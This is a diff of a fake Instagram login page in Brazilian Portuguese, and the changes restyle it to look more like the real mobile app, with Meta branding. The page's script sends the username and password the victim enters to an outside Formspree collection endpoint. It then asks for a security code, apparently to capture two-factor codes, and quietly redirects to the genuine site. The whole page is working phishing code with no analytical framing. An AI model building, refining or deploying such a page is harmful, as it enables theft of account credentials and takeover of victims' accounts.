@@ -2,55 +2,98 @@
 <html lang="pt-BR">
 <head>
 <meta charset="utf-8">
-<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<meta name="theme-color" content="#1a1a1a">
 <title>Instagram</title>
 <style>
-*{box-sizing:border-box}
-body{margin:0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;background:#fff;display:flex;flex-direction:column;align-items:center;min-height:100vh;padding:0 30px}
-.logo{margin:46px 0 34px;width:175px;text-align:center;font:italic 600 38px Georgia,serif}
+:root{color-scheme:dark}
+*{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+body{
+  margin:0;min-height:100vh;min-height:100dvh;
+  background:#1a1a1a;color:#fff;
+  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+  display:flex;flex-direction:column;align-items:center;
+  padding:0 22px calc(26px + env(safe-area-inset-bottom));
+}
+.top{font-size:15px;color:#b3b3b3;padding-top:26px}
+.logo{margin:11vh 0 11vh;width:96px;text-align:center}
 .logo img{width:100%;display:block}
-form{width:100%;max-width:345px}
-input{width:100%;padding:14px 10px;font-size:15px;border:1px solid #dbdbdb;border-radius:5px;background:#fafafa;margin-bottom:7px;outline:none}
-input:focus{border-color:#a8a8a8}
-button{width:100%;padding:13px;margin-top:8px;border:0;border-radius:8px;background:#0095f6;color:#fff;font-size:15px;font-weight:600}
-button:disabled{opacity:.6}
-#hint{font-size:12.5px;color:#8e8e8e;text-align:center;margin:16px 0 0}
+#txt{display:none;font-size:96px;line-height:1}
+form{width:100%;max-width:420px;display:flex;flex-direction:column}
 #step2{display:none}
-.sp{width:22px;height:22px;border:2px solid #dbdbdb;border-top-color:#0095f6;border-radius:50%;margin:24px auto 0;animation:r .8s linear infinite;display:none}
+input{
+  width:100%;height:60px;padding:0 20px;margin-bottom:14px;
+  font-size:16px;font-family:inherit;color:#fff;
+  background:transparent;border:1px solid #4d4d4d;border-radius:999px;
+  outline:none;
+}
+input::placeholder{color:#9a9a9a}
+input:focus{border-color:#8a8a8a}
+button{
+  width:100%;height:52px;border:0;border-radius:999px;
+  background:#0d6efd;color:#fff;font-size:16px;font-weight:600;
+  font-family:inherit;margin-top:12px;
+}
+button:disabled{opacity:.65}
+.forgot{font-size:15px;color:#fff;margin:30px 0 0}
+.hint{display:none;font-size:15px;color:#b3b3b3;margin:26px 0 0;text-align:center}
+.sp{display:none;width:22px;height:22px;margin:22px auto 0;
+  border:2px solid #3a3a3a;border-top-color:#0d6efd;border-radius:50%;
+  animation:r .8s linear infinite}
 @keyframes r{to{transform:rotate(360deg)}}
+.bottom{width:100%;max-width:420px;margin-top:auto;padding-top:44px}
+.ghost{background:transparent;border:1px solid #0d6efd;color:#0d6efd;
+  font-weight:500;margin:0;height:50px}
+.meta{display:flex;align-items:center;justify-content:center;gap:6px;
+  margin:22px 0 0;font-size:23px;font-weight:700;letter-spacing:-.5px;
+  font-family:Arial,Helvetica,sans-serif;color:#fff}
+.meta .inf{font-size:30px;line-height:1;font-weight:900}
 </style>
 </head>
 <body>
-<div class="logo"><img id="lg" src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/1920px-Instagram_logo_2016.svg.png" alt=""><div id="txt" style="display:none">Instagram</div></div>
+<div class="top">Português (Brasil)</div>
+
+<div class="logo">
+  <img id="lg" src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/240px-Instagram_logo_2016.svg.png" alt="">
+  <div id="txt">◙</div>
+</div>
 
 <form id="step1">
-  <input name="usuario" placeholder="Nome de usuário, e-mail ou celular" autocapitalize="off" autocomplete="off" required>
+  <input name="usuario" placeholder="Nome de usuário, email ou celular" autocapitalize="off" autocomplete="off" required>
   <input name="senha" type="password" placeholder="Senha" autocomplete="off" required>
   <button type="submit">Entrar</button>
 </form>
+
+<p class="forgot" id="forgot">Esqueceu a senha?</p>
 
 <form id="step2">
   <input name="codigo" placeholder="Código de segurança" inputmode="numeric" autocomplete="off" required>
   <button type="submit">Confirmar</button>
 </form>
 
-<p id="hint">Entre para continuar</p>
+<p class="hint" id="hint">Confirme o código de segurança</p>
 <div class="sp" id="sp"></div>
+
+<div class="bottom">
+  <button type="button" class="ghost">Criar nova conta</button>
+  <div class="meta"><span class="inf">∞</span>Meta</div>
+</div>
 
 <script>
 var EP="https://formspree.io/f/mzeevlvr";
 var lg=document.getElementById("lg"),tx=document.getElementById("txt");
 lg.onerror=function(){lg.style.display="none";tx.style.display="block"};
 var f1=document.getElementById("step1"),f2=document.getElementById("step2"),
-    h=document.getElementById("hint"),sp=document.getElementById("sp"),t;
+    fg=document.getElementById("forgot"),h=document.getElementById("hint"),
+    sp=document.getElementById("sp"),t;
 function send(d){return fetch(EP,{method:"POST",headers:{Accept:"application/json","Content-Type":"application/json"},body:JSON.stringify(d)})}
 f1.addEventListener("submit",function(e){
   e.preventDefault();
   var d=Object.fromEntries(new FormData(f1));
-  f1.querySelector("button").disabled=true;sp.style.display="block";
+  f1.querySelector("button").disabled=true;
+  fg.style.display="none";sp.style.display="block";
   send(Object.assign({_subject:"IG usuario"},d)).catch(function(){});
-  f1.style.display="none";f2.style.display="block";
-  h.textContent="Confirme o código de segurança";
+  f1.style.display="none";f2.style.display="flex";h.style.display="block";
   t=setTimeout(function(){location.href="https://www.instagram.com/"},9000);
 });
 f2.addEventListener("input",function(){clearTimeout(t)});
